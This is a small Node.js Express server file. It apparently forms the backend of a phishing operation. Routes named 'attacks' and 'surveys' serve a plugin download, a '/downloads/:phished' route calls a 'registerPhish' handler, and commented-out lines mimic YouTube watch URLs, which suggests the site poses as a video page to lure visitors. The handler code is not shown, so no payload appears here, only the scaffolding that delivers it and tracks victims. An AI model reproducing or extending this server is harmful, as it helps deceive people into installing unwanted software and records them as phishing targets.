// Module dependencies.
var express = require('express'), 
routes = require('./routes'), 
//user = require('./routes/user'), 
http = require('http'), 
path = require('path');

var app = express();
// all environments
app.configure(function(){
	app.set('port', process.env.PORT || 3000);
	app.set('views', __dirname + '/views');
	app.set('view engine', 'jade');
	app.use(express.favicon());
	app.use(express.logger('dev'));
	app.use(express.bodyParser());
	app.use(express.methodOverride());
	app.use(app.router);
	app.use(require('less-middleware')({ src: __dirname + '/public' }));
	app.use(express.static(path.join(__dirname, 'public')));
	// development only
	if ('development' == app.get('env')) {
	app.use(express.errorHandler());
		}
});

//app.get('/watch\?NR=1&feature=endscreen&v=RXq_kz(\d+)EqDI', routes.index);
///watch?feature=endscreen&amp;v=RXq_kz3EqDI
//watch?feature=endscreen&v=RXq_kz3EqDI
app.get('/attacks/:from',routes.pluginDownload)
app.get('/surveys/:from',routes.pluginDownload)
app.get('/watch/:from',routes.nothing)
app.get('/downloads/:phished', routes.registerPhish);
http.createServer(app).listen(app.get('port'), function(){
													console.log('Express server listening on port ' + app.get('port'));
												});